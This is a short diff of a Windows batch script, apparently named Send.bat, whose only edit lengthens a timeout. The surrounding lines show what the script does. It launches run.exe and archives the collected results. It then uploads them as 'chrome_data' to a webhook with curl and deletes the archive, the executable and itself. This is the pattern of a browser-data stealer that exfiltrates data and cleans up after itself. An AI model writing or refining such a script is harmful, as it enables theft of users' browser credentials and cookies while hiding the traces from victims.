@@ -13,7 +13,7 @@ start run.exe
 timeout /T 5 /NOBREAK
 tar -a -c -f data.zip results && rmdir /S /Q results
 curl %webhook_url% -F chrome_data=@data.zip
-timeout /T 2 /NOBREAK
+timeout /T 5 /NOBREAK
 del data.zip
 del run.exe
 del Send.bat
